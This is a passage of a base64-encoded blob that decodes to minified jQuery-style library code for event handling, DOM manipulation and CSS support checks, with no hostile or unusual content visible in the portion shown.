iIsIiJdfTtJZS5vcHRncm91cD1JZS5vcHRpb24sSWUudGJvZHk9SWUudGZvb3Q9SWUuY29sZ3JvdXA9SWUuY2FwdGlvbj1JZS50aGVhZCxJZS50aD1JZS50ZDt2YXIgV2U9Lzx8JiM/XHcrOy87IWZ1bmN0aW9uKCl7dmFyIGU9Wi5jcmVhdGVEb2N1bWVudEZyYWdtZW50KCksdD1lLmFwcGVuZENoaWxkKFouY3JlYXRlRWxlbWVudCgiZGl2IikpLG49Wi5jcmVhdGVFbGVtZW50KCJpbnB1dCIpO24uc2V0QXR0cmlidXRlKCJ0eXBlIiwicmFkaW8iKSxuLnNldEF0dHJpYnV0ZSgiY2hlY2tlZCIsImNoZWNrZWQiKSxuLnNldEF0dHJpYnV0ZSgibmFtZSIsInQiKSx0LmFwcGVuZENoaWxkKG4pLGFlLmNoZWNrQ2xvbmU9dC5jbG9uZU5vZGUoITApLmNsb25lTm9kZSghMCkubGFzdENoaWxkLmNoZWNrZWQsdC5pbm5lckhUTUw9Ijx0ZXh0YXJlYT54PC90ZXh0YXJlYT4iLGFlLm5vQ2xvbmVDaGVja2VkPSEhdC5jbG9uZU5vZGUoITApLmxhc3RDaGlsZC5kZWZhdWx0VmFsdWV9KCk7dmFyIFVlPS9ea2V5Lyx6ZT0vXig/Om1vdXNlfHBvaW50ZXJ8Y29udGV4dG1lbnV8ZHJhZ3xkcm9wKXxjbGljay8scWU9L14oW14uXSopKD86XC4oLispfCkvO2NlLmV2ZW50PXtnbG9iYWw6e30sYWRkOmZ1bmN0aW9uKGUsdCxuLHIsaSl7dmFyIHMsbyxhLHUsYyxsLGQsaCxmLHAsXyxtPXhlLmdldChlKTtpZihtKWZvcihuLmhhbmRsZXImJihzPW4sbj1zLmhhbmRsZXIsaT1zLnNlbGVjdG9yKSxuLmd1aWR8fChuLmd1aWQ9Y2UuZ3VpZCsrKSwodT1tLmV2ZW50cyl8fCh1PW0uZXZlbnRzPXt9KSwobz1tLmhhbmRsZSl8fChvPW0uaGFuZGxlPWZ1bmN0aW9uKHQpe3JldHVybiJ1bmRlZmluZWQiIT10eXBlb2YgY2UmJmNlLmV2ZW50LnRyaWdnZXJlZCE9PXQudHlwZT9jZS5ldmVudC5kaXNwYXRjaC5hcHBseShlLGFyZ3VtZW50cyk6dm9pZCAwfSksdD0odHx8IiIpLm1hdGNoKFRlKXx8WyIiXSxjPXQubGVuZ3RoO2MtLTspYT1xZS5leGVjKHRbY10pfHxbXSxmPV89YVsxXSxwPShhWzJdfHwiIikuc3BsaXQoIi4iKS5zb3J0KCksZiYmKGQ9Y2UuZXZlbnQuc3BlY2lhbFtmXXx8e30sZj0oaT9kLmRlbGVnYXRlVHlwZTpkLmJpbmRUeXBlKXx8ZixkPWNlLmV2ZW50LnNwZWNpYWxbZl18fHt9LGw9Y2UuZXh0ZW5kKHt0eXBlOmYsb3JpZ1R5cGU6XyxkYXRhOnIsaGFuZGxlcjpuLGd1aWQ6bi5ndWlkLHNlbGVjdG9yOmksbmVlZHNDb250ZXh0OmkmJmNlLmV4cHIubWF0Y2gubmVlZHNDb250ZXh0LnRlc3QoaSksbmFtZXNwYWNlOnAuam9pbigiLiIpfSxzKSwoaD11W2ZdKXx8KGg9dVtmXT1bXSxoLmRlbGVnYXRlQ291bnQ9MCxkLnNldHVwJiZkLnNldHVwLmNhbGwoZSxyLHAsbykhPT0hMXx8ZS5hZGRFdmVudExpc3RlbmVyJiZlLmFkZEV2ZW50TGlzdGVuZXIoZixvKSksZC5hZGQmJihkLmFkZC5jYWxsKGUsbCksbC5oYW5kbGVyLmd1aWR8fChsLmhhbmRsZXIuZ3VpZD1uLmd1aWQpKSxpP2guc3BsaWNlKGguZGVsZWdhdGVDb3VudCsrLDAsbCk6aC5wdXNoKGwpLGNlLmV2ZW50Lmdsb2JhbFtmXT0hMCl9LHJlbW92ZTpmdW5jdGlvbihlLHQsbixyLGkpe3ZhciBzLG8sYSx1LGMsbCxkLGgsZixwLF8sbT14ZS5oYXNEYXRhKGUpJiZ4ZS5nZXQoZSk7aWYobSYmKHU9bS5ldmVudHMpKXtmb3IodD0odHx8IiIpLm1hdGNoKFRlKXx8WyIiXSxjPXQubGVuZ3RoO2MtLTspaWYoYT1xZS5leGVjKHRbY10pfHxbXSxmPV89YVsxXSxwPShhWzJdfHwiIikuc3BsaXQoIi4iKS5zb3J0KCksZil7Zm9yKGQ9Y2UuZXZlbnQuc3BlY2lhbFtmXXx8e30sZj0ocj9kLmRlbGVnYXRlVHlwZTpkLmJpbmRUeXBlKXx8ZixoPXVbZl18fFtdLGE9YVsyXSYmbmV3IFJlZ0V4cCgiKF58XFwuKSIrcC5qb2luKCJcXC4oPzouKlxcLnwpIikrIihcXC58JCkiKSxvPXM9aC5sZW5ndGg7cy0tOylsPWhbc10sIWkmJl8hPT1sLm9yaWdUeXBlfHxuJiZuLmd1aWQhPT1sLmd1aWR8fGEmJiFhLnRlc3QobC5uYW1lc3BhY2UpfHxyJiZyIT09bC5zZWxlY3RvciYmKCIqKiIhPT1yfHwhbC5zZWxlY3Rvcil8fChoLnNwbGljZShzLDEpLA0KbC5zZWxlY3RvciYmaC5kZWxlZ2F0ZUNvdW50LS0sZC5yZW1vdmUmJmQucmVtb3ZlLmNhbGwoZSxsKSk7byYmIWgubGVuZ3RoJiYoZC50ZWFyZG93biYmZC50ZWFyZG93bi5jYWxsKGUscCxtLmhhbmRsZSkhPT0hMXx8Y2UucmVtb3ZlRXZlbnQoZSxmLG0uaGFuZGxlKSxkZWxldGUgdVtmXSl9ZWxzZSBmb3IoZiBpbiB1KWNlLmV2ZW50LnJlbW92ZShlLGYrdFtjXSxuLHIsITApO2NlLmlzRW1wdHlPYmplY3QodSkmJnhlLnJlbW92ZShlLCJoYW5kbGUgZXZlbnRzIil9fSxkaXNwYXRjaDpmdW5jdGlvbihlKXtlPWNlLmV2ZW50LmZpeChlKTt2YXIgdCxuLHIsaSxzLG89W10sYT1lZS5jYWxsKGFyZ3VtZW50cyksdT0oeGUuZ2V0KHRoaXMsImV2ZW50cyIpfHx7fSlbZS50eXBlXXx8W10sYz1jZS5ldmVudC5zcGVjaWFsW2UudHlwZV18fHt9O2lmKGFbMF09ZSxlLmRlbGVnYXRlVGFyZ2V0PXRoaXMsIWMucHJlRGlzcGF0Y2h8fGMucHJlRGlzcGF0Y2guY2FsbCh0aGlzLGUpIT09ITEpe2ZvcihvPWNlLmV2ZW50LmhhbmRsZXJzLmNhbGwodGhpcyxlLHUpLHQ9MDsoaT1vW3QrK10pJiYhZS5pc1Byb3BhZ2F0aW9uU3RvcHBlZCgpOylmb3IoZS5jdXJyZW50VGFyZ2V0PWkuZWxlbSxuPTA7KHM9aS5oYW5kbGVyc1tuKytdKSYmIWUuaXNJbW1lZGlhdGVQcm9wYWdhdGlvblN0b3BwZWQoKTspZS5ybmFtZXNwYWNlJiYhZS5ybmFtZXNwYWNlLnRlc3Qocy5uYW1lc3BhY2UpfHwoZS5oYW5kbGVPYmo9cyxlLmRhdGE9cy5kYXRhLHI9KChjZS5ldmVudC5zcGVjaWFsW3Mub3JpZ1R5cGVdfHx7fSkuaGFuZGxlfHxzLmhhbmRsZXIpLmFwcGx5KGkuZWxlbSxhKSx2b2lkIDAhPT1yJiYoZS5yZXN1bHQ9cik9PT0hMSYmKGUucHJldmVudERlZmF1bHQoKSxlLnN0b3BQcm9wYWdhdGlvbigpKSk7cmV0dXJuIGMucG9zdERpc3BhdGNoJiZjLnBvc3REaXNwYXRjaC5jYWxsKHRoaXMsZSksZS5yZXN1bHR9fSxoYW5kbGVyczpmdW5jdGlvbihlLHQpe3ZhciBuLHIsaSxzLG89W10sYT10LmRlbGVnYXRlQ291bnQsdT1lLnRhcmdldDtpZihhJiZ1Lm5vZGVUeXBlJiYoImNsaWNrIiE9PWUudHlwZXx8aXNOYU4oZS5idXR0b24pfHxlLmJ1dHRvbjwxKSlmb3IoO3UhPT10aGlzO3U9dS5wYXJlbnROb2RlfHx0aGlzKWlmKDE9PT11Lm5vZGVUeXBlJiYodS5kaXNhYmxlZCE9PSEwfHwiY2xpY2siIT09ZS50eXBlKSl7Zm9yKHI9W10sbj0wO2E+bjtuKyspcz10W25dLGk9cy5zZWxlY3RvcisiICIsdm9pZCAwPT09cltpXSYmKHJbaV09cy5uZWVkc0NvbnRleHQ/Y2UoaSx0aGlzKS5pbmRleCh1KT4tMTpjZS5maW5kKGksdGhpcyxudWxsLFt1XSkubGVuZ3RoKSxyW2ldJiZyLnB1c2gocyk7ci5sZW5ndGgmJm8ucHVzaCh7ZWxlbTp1LGhhbmRsZXJzOnJ9KX1yZXR1cm4gYTx0Lmxlbmd0aCYmby5wdXNoKHtlbGVtOnRoaXMsaGFuZGxlcnM6dC5zbGljZShhKX0pLG99LHByb3BzOiJhbHRLZXkgYnViYmxlcyBjYW5jZWxhYmxlIGN0cmxLZXkgY3VycmVudFRhcmdldCBkZXRhaWwgZXZlbnRQaGFzZSBtZXRhS2V5IHJlbGF0ZWRUYXJnZXQgc2hpZnRLZXkgdGFyZ2V0IHRpbWVTdGFtcCB2aWV3IHdoaWNoIi5zcGxpdCgiICIpLGZpeEhvb2tzOnt9LGtleUhvb2tzOntwcm9wczoiY2hhciBjaGFyQ29kZSBrZXkga2V5Q29kZSIuc3BsaXQoIiAiKSxmaWx0ZXI6ZnVuY3Rpb24oZSx0KXtyZXR1cm4gbnVsbD09ZS53aGljaCYmKGUud2hpY2g9bnVsbCE9dC5jaGFyQ29kZT90LmNoYXJDb2RlOnQua2V5Q29kZSksZX19LG1vdXNlSG9va3M6e3Byb3BzOiJidXR0b24gYnV0dG9ucyBjbGllbnRYIGNsaWVudFkgb2Zmc2V0WCBvZmZzZXRZIHBhZ2VYIHBhZ2VZIHNjcmVlblggc2NyZWVuWSB0b0VsZW1lbnQiLnNwbGl0KCIgIiksZmlsdGVyOmZ1bmN0aW9uKGUsdCl7dmFyIG4scixpLHM9dC5idXR0b247cmV0dXJuIG51bGw9PWUucGFnZVgmJm51bGwhPXQuY2xpZW50WCYmKG49ZS50YXJnZXQub3duZXJEb2N1bWVudHx8WixyPW4uZG9jdW1lbnRFbGVtZW50LGk9bi5ib2R5LGUucGFnZVg9dC5jbGllbnRYKyhyJiZyLnNjcm9sbExlZnR8fGkmJmkuc2Nyb2xsTGVmdHx8MCktKHImJnIuY2xpZW50TGVmdHx8aSYmaS5jbGllbnRMZWZ0fHwwKSxlLnBhZ2VZPXQuY2xpZW50WSsociYmci5zY3JvbGxUb3B8fGkmJmkuc2Nyb2xsVG9wfHwwKS0ociYmci5jbGllbnRUb3B8fGkmJmkuY2xpZW50VG9wfHwwKSksZS53aGljaHx8dm9pZCAwPT09c3x8KGUud2hpY2g9MSZzPzE6MiZzPzM6NCZzPzI6MCksZX19LGZpeDpmdW5jdGlvbihlKXtpZihlW2NlLmV4cGFuZG9dKXJldHVybiBlO3ZhciB0LG4scixpPWUudHlwZSxzPWUsbz10aGlzLmZpeEhvb2tzW2ldO2ZvcihvfHwodGhpcy5maXhIb29rc1tpXT1vPXplLnRlc3QoaSk/dGhpcy5tb3VzZUhvb2tzOlVlLnRlc3QoaSk/dGhpcy5rZXlIb29rczp7fSkscj1vLnByb3BzP3RoaXMucHJvcHMuY29uY2F0KG8ucHJvcHMpOnRoaXMucHJvcHMsZT1uZXcgY2UuRXZlbnQocyksdD1yLmxlbmd0aDt0LS07KW49clt0XSxlW25dPXNbbl07cmV0dXJuIGUudGFyZ2V0fHwoZS50YXJnZXQ9WiksMz09PWUudGFyZ2V0Lm5vZGVUeXBlJiYoZS50YXJnZXQ9ZS50YXJnZXQucGFyZW50Tm9kZSksby5maWx0ZXI/by5maWx0ZXIoZSxzKTplfSxzcGVjaWFsOntsb2FkOntub0J1YmJsZTohMH0sZm9jdXM6e3RyaWdnZXI6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcyE9PXYoKSYmdGhpcy5mb2N1cz8odGhpcy5mb2N1cygpLCExKTp2b2lkIDB9LGRlbGVnYXRlVHlwZToiZm9jdXNpbiJ9LGJsdXI6e3RyaWdnZXI6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcz09PXYoKSYmdGhpcy5ibHVyPyh0aGlzLmJsdXIoKSwhMSk6dm9pZCAwfSxkZWxlZ2F0ZVR5cGU6ImZvY3Vzb3V0In0sY2xpY2s6e3RyaWdnZXI6ZnVuY3Rpb24oKXtyZXR1cm4iY2hlY2tib3giPT09dGhpcy50eXBlJiZ0aGlzLmNsaWNrJiZjZS5ub2RlTmFtZSh0aGlzLCJpbnB1dCIpPyh0aGlzLmNsaWNrKCksITEpOnZvaWQgMH0sX2RlZmF1bHQ6ZnVuY3Rpb24oZSl7cmV0dXJuIGNlLm5vZGVOYW1lKGUudGFyZ2V0LCJhIil9fSxiZWZvcmV1bmxvYWQ6e3Bvc3REaXNwYXRjaDpmdW5jdGlvbihlKXt2b2lkIDAhPT1lLnJlc3VsdCYmZS5vcmlnaW5hbEV2ZW50JiYoZS5vcmlnaW5hbEV2ZW50LnJldHVyblZhbHVlPWUucmVzdWx0KX19fX0sY2UucmVtb3ZlRXZlbnQ9ZnVuY3Rpb24oZSx0LG4pe2UucmVtb3ZlRXZlbnRMaXN0ZW5lciYmZS5yZW1vdmVFdmVudExpc3RlbmVyKHQsbil9LGNlLkV2ZW50PWZ1bmN0aW9uKGUsdCl7cmV0dXJuIHRoaXMgaW5zdGFuY2VvZiBjZS5FdmVudD8oZSYmZS50eXBlPyh0aGlzLm9yaWdpbmFsRXZlbnQ9ZSx0aGlzLnR5cGU9ZS50eXBlLHRoaXMuaXNEZWZhdWx0UHJldmVudGVkPWUuZGVmYXVsdFByZXZlbnRlZHx8dm9pZCAwPT09ZS5kZWZhdWx0UHJldmVudGVkJiZlLnJldHVyblZhbHVlPT09ITE/eTpnKTp0aGlzLnR5cGU9ZSx0JiZjZS5leHRlbmQodGhpcyx0KSx0aGlzLnRpbWVTdGFtcD1lJiZlLnRpbWVTdGFtcHx8Y2Uubm93KCksdm9pZCh0aGlzW2NlLmV4cGFuZG9dPSEwKSk6bmV3IGNlLkV2ZW50KGUsdCl9LGNlLkV2ZW50LnByb3RvdHlwZT17Y29uc3RydWN0b3I6Y2UuRXZlbnQsaXNEZWZhdWx0UHJldmVudGVkOmcsaXNQcm9wYWdhdGlvblN0b3BwZWQ6Zyxpc0ltbWVkaWF0ZVByb3BhZ2F0aW9uU3RvcHBlZDpnLHByZXZlbnREZWZhdWx0OmZ1bmN0aW9uKCl7dmFyIGU9dGhpcy5vcmlnaW5hbEV2ZW50O3RoaXMuaXNEZWZhdWx0UHJldmVudGVkPXksZSYmZS5wcmV2ZW50RGVmYXVsdCgpfSxzdG9wUHJvcGFnYXRpb246ZnVuY3Rpb24oKXt2YXIgZT10aGlzLm9yaWdpbmFsRXZlbnQ7dGhpcy5pc1Byb3BhZ2F0aW9uU3RvcHBlZD15LGUmJmUuc3RvcFByb3BhZ2F0aW9uKCl9LHN0b3BJbW1lZGlhdGVQcm9wYWdhdGlvbjpmdW5jdGlvbigpe3ZhciBlPXRoaXMub3JpZ2luYWxFdmVudDt0aGlzLmlzSW1tZWRpYXRlUHJvcGFnYXRpb25TdG9wcGVkPXksZSYmZS5zdG9wSW1tZWRpYXRlUHJvcGFnYXRpb24oKSx0aGlzLnN0b3BQcm9wYWdhdGlvbigpfX0sY2UuZWFjaCh7bW91c2VlbnRlcjoibW91c2VvdmVyIixtb3VzZWxlYXZlOiJtb3VzZW91dCIscG9pbnRlcmVudGVyOiJwb2ludGVyb3ZlciIscG9pbnRlcmxlYXZlOiJwb2ludGVyb3V0In0sZnVuY3Rpb24oZSx0KXtjZS5ldmVudC5zcGVjaWFsW2VdPXtkZWxlZ2F0ZVR5cGU6dCxiaW5kVHlwZTp0LGhhbmRsZTpmdW5jdGlvbihlKXt2YXIgbixyPXRoaXMsaT1lLnJlbGF0ZWRUYXJnZXQscz1lLmhhbmRsZU9iajtyZXR1cm4gaSYmKGk9PT1yfHxjZS5jb250YWlucyhyLGkpKXx8KGUudHlwZT1zLm9yaWdUeXBlLG49cy5oYW5kbGVyLmFwcGx5KHRoaXMsYXJndW1lbnRzKSxlLnR5cGU9dCksbn19fSksY2UuZm4uZXh0ZW5kKHtvbjpmdW5jdGlvbihlLHQsbixyKXtyZXR1cm4gYih0aGlzLGUsdCxuLHIpfSxvbmU6ZnVuY3Rpb24oZSx0LG4scil7cmV0dXJuIGIodGhpcyxlLHQsbixyLDEpfSxvZmY6ZnVuY3Rpb24oZSx0LG4pe3ZhciByLGk7aWYoZSYmZS5wcmV2ZW50RGVmYXVsdCYmZS5oYW5kbGVPYmopcmV0dXJuIHI9ZS5oYW5kbGVPYmosY2UoZS5kZWxlZ2F0ZVRhcmdldCkub2ZmKHIubmFtZXNwYWNlP3Iub3JpZ1R5cGUrIi4iK3IubmFtZXNwYWNlOnIub3JpZ1R5cGUsci5zZWxlY3RvcixyLmhhbmRsZXIpLHRoaXM7aWYoIm9iamVjdCI9PXR5cGVvZiBlKXtmb3IoaSBpbiBlKXRoaXMub2ZmKGksdCxlW2ldKTtyZXR1cm4gdGhpc31yZXR1cm4gdCE9PSExJiYiZnVuY3Rpb24iIT10eXBlb2YgdHx8KG49dCx0PXZvaWQgMCksbj09PSExJiYobj1nKSx0aGlzLmVhY2goZnVuY3Rpb24oKXtjZS5ldmVudC5yZW1vdmUodGhpcyxlLG4sdCl9KX19KTt2YXIgSmU9LzwoPyFhcmVhfGJyfGNvbHxlbWJlZHxocnxpbWd8aW5wdXR8bGlua3xtZXRhfHBhcmFtKSgoW1x3Oi1dKylbXj5dKilcLz4vZ2ksJGU9LzxzY3JpcHR8PHN0eWxlfDxsaW5rL2ksQmU9L2NoZWNrZWRccyooPzpbXj1dfD1ccyouY2hlY2tlZC4pL2ksVmU9L150cnVlXC8oLiopLyxHZT0vXlxzKjwhKD86XFtDREFUQVxbfC0tKXwoPzpcXVxdfC0tKT5ccyokL2c7Y2UuZXh0ZW5kKHtodG1sUHJlZmlsdGVyOmZ1bmN0aW9uKGUpe3JldHVybiBlLnJlcGxhY2UoSmUsIjwkMT48LyQyPiIpfSxjbG9uZTpmdW5jdGlvbihlLHQsbil7dmFyIHIsaSxzLG8sYT1lLmNsb25lTm9kZSghMCksdT1jZS5jb250YWlucyhlLm93bmVyRG9jdW1lbnQsZSk7aWYoIShhZS5ub0Nsb25lQ2hlY2tlZHx8MSE9PWUubm9kZVR5cGUmJjExIT09ZS5ub2RlVHlwZXx8Y2UuaXNYTUxEb2MoZSkpKWZvcihvPXAoYSkscz1wKGUpLHI9MCxpPXMubGVuZ3RoO2k+cjtyKyspVChzW3JdLG9bcl0pO2lmKHQpaWYobilmb3Iocz1zfHxwKGUpLG89b3x8cChhKSxyPTAsaT1zLmxlbmd0aDtpPnI7cisrKXcoc1tyXSxvW3JdKTtlbHNlIHcoZSxhKTtyZXR1cm4gbz1wKGEsInNjcmlwdCIpLG8ubGVuZ3RoPjAmJl8obywhdSYmcChlLCJzY3JpcHQiKSksYX0sY2xlYW5EYXRhOmZ1bmN0aW9uKGUpe2Zvcih2YXIgdCxuLHIsaT1jZS5ldmVudC5zcGVjaWFsLHM9MDt2b2lkIDAhPT0obj1lW3NdKTtzKyspaWYoU2Uobikpe2lmKHQ9blt4ZS5leHBhbmRvXSl7aWYodC5ldmVudHMpZm9yKHIgaW4gdC5ldmVudHMpaVtyXT9jZS5ldmVudC5yZW1vdmUobixyKTpjZS5yZW1vdmVFdmVudChuLHIsdC5oYW5kbGUpO25beGUuZXhwYW5kb109dm9pZCAwfW5bamUuZXhwYW5kb10mJihuW2plLmV4cGFuZG9dPXZvaWQgMCl9fX0pLGNlLmZuLmV4dGVuZCh7ZG9tTWFuaXA6WSxkZXRhY2g6ZnVuY3Rpb24oZSl7cmV0dXJuIEQodGhpcyxlLCEwKX0scmVtb3ZlOmZ1bmN0aW9uKGUpe3JldHVybiBEKHRoaXMsZSl9LHRleHQ6ZnVuY3Rpb24oZSl7cmV0dXJuIERlKHRoaXMsZnVuY3Rpb24oZSl7cmV0dXJuIHZvaWQgMD09PWU/Y2UudGV4dCh0aGlzKTp0aGlzLmVtcHR5KCkuZWFjaChmdW5jdGlvbigpezEhPT10aGlzLm5vZGVUeXBlJiYxMSE9PXRoaXMubm9kZVR5cGUmJjkhPT10aGlzLm5vZGVUeXBlfHwodGhpcy50ZXh0Q29udGVudD1lKX0pfSxudWxsLGUsYXJndW1lbnRzLmxlbmd0aCl9LGFwcGVuZDpmdW5jdGlvbigpe3JldHVybiBZKHRoaXMsYXJndW1lbnRzLGZ1bmN0aW9uKGUpe2lmKDE9PT10aGlzLm5vZGVUeXBlfHwxMT09PXRoaXMubm9kZVR5cGV8fDk9PT10aGlzLm5vZGVUeXBlKXt2YXIgdD1NKHRoaXMsZSk7dC5hcHBlbmRDaGlsZChlKX19KX0scHJlcGVuZDpmdW5jdGlvbigpe3JldHVybiBZKHRoaXMsYXJndW1lbnRzLGZ1bmN0aW9uKGUpe2lmKDE9PT10aGlzLm5vZGVUeXBlfHwxMT09PXRoaXMubm9kZVR5cGV8fDk9PT10aGlzLm5vZGVUeXBlKXt2YXIgdD1NKHRoaXMsZSk7dC5pbnNlcnRCZWZvcmUoZSx0LmZpcnN0Q2hpbGQpfX0pfSxiZWZvcmU6ZnVuY3Rpb24oKXtyZXR1cm4gWSh0aGlzLGFyZ3VtZW50cyxmdW5jdGlvbihlKXt0aGlzLnBhcmVudE5vZGUmJnRoaXMucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUoZSx0aGlzKX0pfSxhZnRlcjpmdW5jdGlvbigpe3JldHVybiBZKHRoaXMsYXJndW1lbnRzLGZ1bmN0aW9uKGUpe3RoaXMucGFyZW50Tm9kZSYmdGhpcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShlLHRoaXMubmV4dFNpYmxpbmcpfSl9LGVtcHR5OmZ1bmN0aW9uKCl7Zm9yKHZhciBlLHQ9MDtudWxsIT0oZT10aGlzW3RdKTt0KyspMT09PWUubm9kZVR5cGUmJihjZS5jbGVhbkRhdGEocChlLCExKSksZS50ZXh0Q29udGVudD0iIik7cmV0dXJuIHRoaXN9LGNsb25lOmZ1bmN0aW9uKGUsdCl7cmV0dXJuIGU9bnVsbD09ZT8hMTplLHQ9bnVsbD09dD9lOnQsdGhpcy5tYXAoZnVuY3Rpb24oKXtyZXR1cm4gY2UuY2xvbmUodGhpcyxlLHQpfSl9LGh0bWw6ZnVuY3Rpb24oZSl7cmV0dXJuIERlKHRoaXMsZnVuY3Rpb24oZSl7dmFyIHQ9dGhpc1swXXx8e30sbj0wLHI9dGhpcy5sZW5ndGg7aWYodm9pZCAwPT09ZSYmMT09PXQubm9kZVR5cGUpcmV0dXJuIHQuaW5uZXJIVE1MO2lmKCJzdHJpbmciPT10eXBlb2YgZSYmISRlLnRlc3QoZSkmJiFJZVsoUmUuZXhlYyhlKXx8WyIiLCIiXSlbMV0udG9Mb3dlckNhc2UoKV0pe2U9Y2UuaHRtbFByZWZpbHRlcihlKTt0cnl7Zm9yKDtyPm47bisrKXQ9dGhpc1tuXXx8e30sMT09PXQubm9kZVR5cGUmJihjZS5jbGVhbkRhdGEocCh0LCExKSksdC5pbm5lckhUTUw9ZSk7dD0wfWNhdGNoKGkpe319dCYmdGhpcy5lbXB0eSgpLmFwcGVuZChlKX0sbnVsbCxlLGFyZ3VtZW50cy5sZW5ndGgpfSxyZXBsYWNlV2l0aDpmdW5jdGlvbigpe3ZhciBlPVtdO3JldHVybiBZKHRoaXMsYXJndW1lbnRzLGZ1bmN0aW9uKHQpe3ZhciBuPXRoaXMucGFyZW50Tm9kZTtjZS5pbkFycmF5KHRoaXMsZSk8MCYmKGNlLmNsZWFuRGF0YShwKHRoaXMpKSxuJiZuLnJlcGxhY2VDaGlsZCh0LHRoaXMpKX0sZSl9fSksY2UuZWFjaCh7YXBwZW5kVG86ImFwcGVuZCIscHJlcGVuZFRvOiJwcmVwZW5kIixpbnNlcnRCZWZvcmU6ImJlZm9yZSIsaW5zZXJ0QWZ0ZXI6ImFmdGVyIixyZXBsYWNlQWxsOiJyZXBsYWNlV2l0aCJ9LGZ1bmN0aW9uKGUsdCl7Y2UuZm5bZV09ZnVuY3Rpb24oZSl7Zm9yKHZhciBuLHI9W10saT1jZShlKSxzPWkubGVuZ3RoLTEsbz0wO3M+PW87bysrKW49bz09PXM/dGhpczp0aGlzLmNsb25lKCEwKSxjZShpW29dKVt0XShuKSxuZS5hcHBseShyLG4uZ2V0KCkpO3JldHVybiB0aGlzLnB1c2hTdGFjayhyKX19KTt2YXIgWGUsUWU9e0hUTUw6ImJsb2NrIixCT0RZOiJibG9jayJ9LEtlPS9ebWFyZ2luLyxaZT1uZXcgUmVnRXhwKCJeKCIrRWUrIikoPyFweClbYS16JV0rJCIsImkiKSxldD1mdW5jdGlvbihlKXt2YXIgdD1lLm93bmVyRG9jdW1lbnQuZGVmYXVsdFZpZXc7cmV0dXJuIHQmJnQub3BlbmVyfHwodD1uKSx0LmdldENvbXB1dGVkU3R5bGUoZSl9LHR0PWZ1bmN0aW9uKGUsdCxuLHIpe3ZhciBpLHMsbz17fTtmb3IocyBpbiB0KW9bc109ZS5zdHlsZVtzXSxlLnN0eWxlW3NdPXRbc107aT1uLmFwcGx5KGUscnx8W10pO2ZvcihzIGluIHQpZS5zdHlsZVtzXT1vW3NdO3JldHVybiBpfSxudD1aLmRvY3VtZW50RWxlbWVudDshZnVuY3Rpb24oKXtmdW5jdGlvbiBlKCl7YS5zdHlsZS5jc3NUZXh0PSItd2Via2l0LWJveC1zaXppbmc6Ym9yZGVyLWJveDstbW96LWJveC1zaXppbmc6Ym9yZGVyLWJveDtib3gtc2l6aW5nOmJvcmRlci1ib3g7cG9zaXRpb246cmVsYXRpdmU7ZGlzcGxheTpibG9jazttYXJnaW46YXV0bztib3JkZXI6MXB4O3BhZGRpbmc6MXB4O3RvcDoxJTt3aWR0aDo1MCUiLGEuaW5uZXJIVE1MPSIiLG50LmFwcGVuZENoaWxkKG8pO3ZhciBlPW4uZ2V0Q29tcHV0ZWRTdHlsZShhKTt0PSIxJSIhPT1lLnRvcCxzPSIycHgiPT09ZS5tYXJnaW5MZWZ0LHI9IjRweCI9PT1lLndpZHRoLGEuc3R5bGUubWFyZ2luUmlnaHQ9IjUwJSIsaT0iNHB4Ij09PWUubWFyZ2luUmlnaHQsbnQucmVtb3ZlQ2hpbGQobyl9dmFyIHQscixpLHMsbz1aLmNyZWF0ZUVsZW1lbnQoImRpdiIpLGE9Wi5jcmVhdGVFbGVtZW50KCJkaXYiKTthLnN0eWxlJiYoYS5zdHlsZS5iYWNrZ3JvdW5kQ2xpcD0iY29udGVudC1ib3giLGEuY2xvbmVOb2RlKCEwKS5zdHlsZS5iYWNrZ3JvdW5kQ2xpcD0iIixhZS5jbGVhckNsb25lU3R5bGU9ImNvbnRlbnQtYm94Ij09PWEuc3R5bGUuYmFja2dyb3VuZENsaXAsby5zdHlsZS5jc3NUZXh0PSJib3JkZXI6MDt3aWR0aDo4cHg7aGVpZ2h0OjA7dG9wOjA7bGVmdDotOTk5OXB4O3BhZGRpbmc6MDttYXJnaW4tdG9wOjFweDtwb3NpdGlvbjphYnNvbHV0ZSIsby5hcHBlbmRDaGlsZChhKSxjZS5leHRlbmQoYWUse3BpeGVsUG9zaXRpb246ZnVuY3Rpb24oKXtyZXR1cm4gZSgpLHR9LGJveFNpemluZ1JlbGlhYmxlOmZ1bmN0aW9uKCl7cmV0dXJuIG51bGw9PXImJmUoKSxyfSxwaXhlbE1hcmdpblJpZ2h0OmZ1bmN0aW9uKCl7cmV0dXJuIG51bGw9PXImJmUoKSxpfSxyZWxpYWJsZU1hcmdpbkxlZnQ6ZnVuY3Rpb24oKXtyZXR1cm4gbnVsbD09ciYmZSgpLHN9LHJlbGlhYmxlTWFyZ2luUmlnaHQ6ZnVuY3Rpb24oKXt2YXIgZSx0PWEuYXBwZW5kQ2hpbGQoWi5jcmVhdGVFbGVtZW50KCJkaXYiKSk7cmV0dXJuIHQuc3R5bGUuY3NzVGV4dD1hLnN0eWxlLmNzc1RleHQ9Ii13ZWJraXQtYm94LXNpemluZzpjb250ZW50LWJveDtib3gtc2l6aW5nOmNvbnRlbnQtYm94O2Rpc3BsYXk6YmxvY2s7bWFyZ2luOjA7Ym9yZGVyOjA7cGFkZGluZzowIix0LnN0eWxlLm1hcmdpblJpZ2h0PXQuc3R5bGUud2lkdGg9IjAiLGEuc3R5bGUud2lkdGg9IjFweCIsbnQuYXBwZW5kQ2hpbGQobyksZT0hcGFyc2VGbG9hdChuLmdldENvbXB1dGVkU3R5bGUodCkubWFyZ2luUmlnaHQpLG50LnJlbW92ZUNoaWxkKG8pLGEucmVtb3ZlQ2hpbGQodCksZX19KSl9KCk7dmFyIHJ0PS9eKG5vbmV8dGFibGUoPyEtY1tlYV0pLispLyxpdD17cG9zaXRpb246ImFic29sdXRlIix2aXNpYmlsaXR5OiJoaWRkZW4iLGRpc3BsYXk6ImJsb2NrIn0sc3Q9e2xldHRlclNwYWNpbmc6IjAiLGZvbnRXZWlnaHQ6IjQwMCJ9LG90PVsiV2Via2l0IiwiTyIsIk1veiIsIm1zIl0sYXQ9Wi5jcmVhdGVFbGVtZW50KCJkaXYiKS5zdHlsZTtjZS5leHRlbmQoe2Nzc0hvb2tzOntvcGFjaXR5OntnZXQ6ZnVuY3Rpb24oZSx0KXtpZih0KXt2YXIgbj1qKGUsIm9wYWNpdHkiKTtyZXR1cm4iIj09PW4/IjEiOm59fX19LGNzc051bWJlcjp7YW5pbWF0aW9uSXRlcmF0aW9u